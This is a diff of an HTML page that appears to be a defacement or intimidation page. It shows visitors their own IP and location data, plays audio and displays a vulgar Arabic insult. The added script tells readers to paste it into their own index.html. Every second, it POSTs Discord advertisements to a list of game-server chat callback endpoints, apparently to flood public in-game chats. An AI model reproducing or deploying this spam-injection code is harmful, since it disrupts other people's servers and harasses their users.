@@ -1,4 +1,6 @@
+
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -8,10 +10,10 @@
         body {
             margin: 0;
             padding: 0;
-            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background: url('https://cdn.discordapp.com/attachments/1401231921433804914/1403447362999025865/0F21B0CE-4884-4EB3-9685-FCE4782BB116.png?ex=689795b6&is=68964436&hm=1d0ff1bab4a04dbb89e6a41afdda13f6b08e41a460ac06a121f22bcfda56268b&') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
-            color: #FFCC00;
+            color: #FFFFFF;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,35 +22,34 @@
             text-align: center;
         }
         .image-container img {
-            width: 750px; 
+            width: 500px; 
             height: auto;
-            border: 2px solid #FFCC00; 
+            border: 2px solid #FFFFFF; 
             border-radius: 15px;
-            box-shadow: 0 0 15px rgba(152, 172, 0, 0.8); 
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.8); 
         }
         .info {
             margin-top: 20px;
             font-size: 1.5em;
-            color: #FFCC00; 
-            text-shadow: 0px 0px 8px #FFCC00, 0px 0px 15px #FFCC00, 0px 0px 25px #FFCC00; 
+            color: #FFFFFF; 
+            text-shadow: 0px 0px 8px #FFFFFF, 0px 0px 15px #FFFFFF, 0px 0px 25px #FFFFFF; 
             letter-spacing: 4.5px; 
             white-space: pre-wrap;
         }
         .text {
             margin-top: 20px;
             font-size: 3em; 
-            color: #FFCC00; 
-            text-shadow: 0px 0px 8px #FFCC00, 0px 0px 15px #FFCC00, 0px 0px 25px #FFCC00; 
+            color: #FF0000; 
+            text-shadow: 0px 0px 8px #FFFFFF, 0px 0px 15px #FFFFFF, 0px 0px 25px #FFFFFF; 
             letter-spacing: 4.5px; 
         }
     </style>
 </head>
 <body>
     <div class="image-container">
-        <img src="https://cdn.discordapp.com/attachments/1396125618935955547/1401016348124909749/standard.gif?ex=688ebda7&is=688d6c27&hm=fb2b9b3c3a6c9a13901db41985f2e076e8be136be7b4d82af531ee8ed28b03b6&" alt="Discord Image">
-    </div>
+
     <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1364231189862547458/1401015215302246560/03c18b7dbc028989.mp4?ex=688ebc98&is=688d6b18&hm=8f7efeaaacdf23da6ba9393622bd0c5ab446e0fa5e7ce7906a1f8f04e4b6d9f6&" type="audio/mpeg">
+        <source src="https://cdn.discordapp.com/attachments/1390882671223115786/1401642436127625357/3905be207137a67f.mp3?ex=689104be&is=688fb33e&hm=dbd053ec6ac485d8e2d554f93d4a11eeb428d122aa8e08a25d5adcaddc0b0702&" type="audio/mpeg">
         Your browser does not support the audio element.
     </audio>
    <div class="info" id="ip-info">
@@ -60,9 +61,10 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-    <div class="text"> يا منايك team 101 فوق راسكم 
+    <div class="text"> كس اخت دمار عاخت انس
 
-by:4op</div>
+
+</div>
 
     <script>
          fetch('https://ipinfo.io/json')
@@ -72,6 +74,24 @@ by:4op</div>
             const infoDiv = document.getElementById('ip-info');
             infoDiv.textContent = JSON.stringify(data, null, 2);
         });
+    </script>
+
+<script>
+    // put the js code in YOUR index.html
+// حط الكود ب الاندكس حقك index.html
+// vjmi pulled all of them 👀
+// discord.gg/UAEE #1
+const msg = `discord.gg/t101 - discord.gg/4ns`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
     </script>
 </body>
 </html>
